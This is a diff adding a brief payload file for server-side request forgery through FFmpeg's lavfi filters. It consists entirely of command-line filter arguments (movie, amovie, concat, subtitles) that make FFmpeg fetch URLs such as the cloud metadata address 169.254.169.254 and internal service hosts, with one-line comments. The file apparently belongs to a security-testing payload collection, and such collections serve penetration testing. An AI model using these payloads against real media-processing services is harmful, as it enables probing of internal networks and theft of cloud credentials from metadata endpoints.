@@ -1,0 +1,16 @@
+# FFmpeg Lavfi (Filter) Protocol SSRF Payloads
+# =============================================
+# lavfi allows creating synthetic video/audio using filters,
+# some filters can read external resources.
+
+# Movie filter (reads external file/URL)
+-vf "movie=http://169.254.169.254/latest/meta-data/"
+
+# Amovie filter for audio
+-af "amovie=http://internal.service:8080/audio.mp3"
+
+# Concat filter with external sources
+-filter_complex "movie=http://internal:8080/a.mp4[a];movie=http://internal:8080/b.mp4[b];[a][b]concat"
+
+# Subtitles filter (reads .srt from URL)
+-vf "subtitles=http://internal.service/subs.srt"
